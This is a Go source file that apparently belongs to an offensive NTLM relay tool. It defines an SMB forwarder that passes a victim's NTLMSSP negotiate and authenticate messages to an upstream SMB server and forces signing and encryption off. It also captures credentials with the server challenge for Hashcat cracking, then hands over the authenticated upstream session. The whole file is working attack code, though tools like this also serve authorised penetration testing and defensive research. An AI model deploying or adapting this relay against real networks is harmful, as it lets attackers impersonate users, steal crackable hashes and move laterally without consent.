// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"fmt"
	"net"
	"strconv"

	"github.com/jfjallid/go-smb/ntlmssp"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/encoder"
	"github.com/jfjallid/go-smb/smb/server"
)

// smbForwarder drives an upstream NTLMSSP exchange over an SMB transport on
// behalf of a relayed inbound auth. One forwarder is used per inbound auth
// session — it owns the upstream *smb.Connection from Negotiate (leg 1)
// until either Take transfers ownership or Close tears it down.
//
// SPNEGO wrap/unwrap is handled by the listener; the forwarder's interface
// boundary carries raw NTLMSSP. Leg 2 is re-wrapped internally because the
// upstream client API (SendSessionSetup2WithBlob) requires SPNEGO bytes.
type smbForwarder struct {
	target Target
	opts   smb.Options
	logger server.Logger

	upstream        *smb.Connection // populated in Negotiate; consumed in Take or Close
	serverChallenge [8]byte         // captured from the upstream's NTLMSSP CHALLENGE
}

// newSMBForwarder constructs an SMB forwarder targeting the supplied
// upstream. opts is shallow-copied; relay-friendly defaults are forced on.
func newSMBForwarder(t Target, opts smb.Options, logger server.Logger) (*smbForwarder, error) {
	if t.Protocol != ProtoSMB {
		return nil, fmt.Errorf("newSMBForwarder called with non-SMB target %s", t.Raw)
	}
	host, portStr, err := net.SplitHostPort(t.Host)
	if err != nil {
		return nil, fmt.Errorf("parse target %q: %w", t.Host, err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		return nil, fmt.Errorf("parse target %q: invalid port %q", t.Host, portStr)
	}
	if opts.Host == "" {
		opts.Host = host
	}
	if opts.Port == 0 {
		opts.Port = port
	}
	// Relay can't sign or encrypt — the per-message keys live on the inbound
	// (client-side) session and we never see them. Force these off even if
	// the caller forgot.
	opts.ManualLogin = true
	opts.ForceSMB2 = true
	opts.DisableSigning = true
	opts.DisableEncryption = true
	return &smbForwarder{target: t, opts: opts, logger: logger}, nil
}

// Target returns the upstream target this forwarder is bound to.
func (f *smbForwarder) Target() Target { return f.target }

// Negotiate forwards a raw NTLMSSP NEGOTIATE token to the upstream and
// returns the upstream's raw NTLMSSP CHALLENGE. SPNEGO wrap/unwrap is the
// listener's responsibility.
func (f *smbForwarder) Negotiate(neg []byte) ([]byte, error) {
	if f.upstream != nil {
		return nil, fmt.Errorf("Negotiate called twice")
	}
	if len(neg) < 8 || string(neg[:7]) != "NTLMSSP" {
		return nil, fmt.Errorf("Negotiate: not an NTLMSSP message")
	}

	up, err := smb.NewConnection(f.opts)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", f.target.Host, err)
	}

	respToken, err := up.SendSessionSetup1WithToken(neg)
	if err != nil {
		up.Close()
		return nil, fmt.Errorf("upstream SessionSetup1: %w", err)
	}
	f.upstream = up

	// Best-effort parse of the upstream CHALLENGE — needed so the captured
	// Credential.ServerChallenge / Hashcat string identifies the actual
	// challenge the client signed against.
	chall := ntlmssp.NewChallenge()
	if err := encoder.Unmarshal(respToken, &chall); err == nil {
		var b [8]byte
		for i := 0; i < 8; i++ {
			b[i] = byte(chall.ServerChallenge >> (8 * i))
		}
		f.serverChallenge = b
	} else if f.logger != nil {
		f.logger.Debugf("parse upstream CHALLENGE: %v", err)
	}
	return respToken, nil
}

// Authenticate forwards a raw NTLMSSP AUTHENTICATE token plus an optional
// MechListMIC to the upstream and returns the captured Credential and the
// upstream NT status. The forwarder re-wraps the raw token into a SPNEGO
// NegTokenResp internally because the upstream client API requires it; this
// keeps the relay listener protocol-agnostic.
//
// remote is the inbound client address used for credential attribution.
func (f *smbForwarder) Authenticate(remote net.Addr, auth, mic []byte) (*Credential, uint32, error) {
	if f.upstream == nil {
		return nil, 0, fmt.Errorf("Authenticate without prior Negotiate")
	}
	if len(auth) < 8 || string(auth[:7]) != "NTLMSSP" {
		return nil, 0, fmt.Errorf("Authenticate: not an NTLMSSP message")
	}

	var parsed ntlmssp.Authenticate
	if err := encoder.Unmarshal(auth, &parsed); err != nil {
		return nil, 0, fmt.Errorf("decode NTLMSSP Authenticate: %w", err)
	}
	cred := buildCredentialFromAuth(&parsed, f.serverChallenge, remote)

	blob, err := wrapNegRespAuth(auth, mic)
	if err != nil {
		return cred, 0, fmt.Errorf("wrap upstream NegTokenResp: %w", err)
	}
	upstreamStatus, err := f.upstream.SendSessionSetup2WithBlob(blob)
	if err != nil {
		return cred, 0, fmt.Errorf("upstream SessionSetup2: %w", err)
	}
	return cred, upstreamStatus, nil
}

// Take returns the upstream Connection and zeroes the field. Close is a no-op
// afterwards.
func (f *smbForwarder) Take() *smb.Connection {
	up := f.upstream
	f.upstream = nil
	return up
}

// Close tears down the upstream connection if still owned by the forwarder.
// Idempotent.
func (f *smbForwarder) Close() {
	if f.upstream == nil {
		return
	}
	f.upstream.Close()
	f.upstream = nil
}
